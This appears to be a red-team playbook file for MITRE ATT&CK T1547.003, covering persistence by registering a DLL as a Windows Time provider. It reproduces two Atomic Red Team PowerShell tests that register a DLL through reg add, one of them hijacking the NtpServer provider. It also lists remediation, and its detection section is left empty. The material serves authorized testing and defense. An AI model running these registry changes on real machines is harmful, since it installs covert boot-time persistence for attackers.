---
name: "T1547.003_time-providers"
description: "Adversaries may abuse time providers to execute DLLs when the system boots."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1547.003
  - persistence
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1547.003"
tactic: "persistence"
all_tactics:
  - persistence
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1547/003"
tech_stack:
  - windows
cwe_ids:
  - CWE-276
chains_with:
  - T1547
  - T1547.001
  - T1547.002
  - T1547.004
  - T1547.005
  - T1547.006
  - T1547.007
  - T1547.008
  - T1547.009
  - T1547.010
  - T1547.012
  - T1547.013
  - T1547.014
  - T1547.015
prerequisites:
  - T1547
severity_boost:
  T1547: "Chain with T1547 for deeper attack path"
  T1547.001: "Chain with T1547.001 for deeper attack path"
  T1547.002: "Chain with T1547.002 for deeper attack path"
---

# T1547.003 Time Providers

> **Sub-technique of:** T1547

## High-Level Description

Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.

Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.

Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.

## Kill Chain Phase

- Persistence (TA0003)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Time Providers technique is applicable to target environment
- [ ] Check Windows systems for indicators of Time Providers
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Create a new time provider

Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
The new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt
in C:\Users\Public\ as validation that the test is successful.

Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
net stop w32time
Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f
net start w32time
```

### Atomic Test 2: Edit an existing time provider

Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
The time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt
in C:\Users\Public\ as validation that the test is successful.

Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
net stop w32time
Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f
net start w32time
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Time Providers by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1547.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1024 Restrict Registry Permissions

Consider using Group Policy to configure and block modifications to W32Time parameters in the Registry.

### M1022 Restrict File and Directory Permissions

Consider using Group Policy to configure and block additions/modifications to W32Time DLLs.

## Detection

### Detect Abuse of Windows Time Providers for Persistence

## Risk Assessment

| Finding                             | Severity | Impact      |
| ----------------------------------- | -------- | ----------- |
| Time Providers technique applicable | High     | Persistence |

## CWE Categories

| CWE ID  | Title                         |
| ------- | ----------------------------- |
| CWE-276 | Incorrect Default Permissions |

## References

- [Github W32Time Oct 2017](https://github.com/scottlundgren/w32time)
- [Microsoft W32Time May 2017](https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings)
- [Microsoft W32Time Feb 2018](https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top)
- [Microsoft TimeProvider](https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx)
- [TechNet Autoruns](https://technet.microsoft.com/en-us/sysinternals/bb963902)
- [Atomic Red Team - T1547.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.003)
- [MITRE ATT&CK - T1547.003](https://attack.mitre.org/techniques/T1547/003)
